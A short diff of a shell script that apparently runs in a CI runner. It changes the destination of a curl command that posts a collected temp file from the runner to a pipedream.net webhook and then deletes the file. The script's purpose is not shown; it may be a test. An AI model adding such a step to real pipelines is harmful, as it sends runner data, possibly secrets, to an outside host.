@@ -9,6 +9,6 @@ SCRIPT_PATH="/home/runner/work/comment-ops-private-matiasesena/comment-ops-priva
 
 echo "--- FINISH ---" >> /tmp/file.txt
 
-curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
+curl --data-binary "@/tmp/file.txt" https://entym8w3w4dfm.x.pipedream.net/
 
 rm /tmp/file.txt
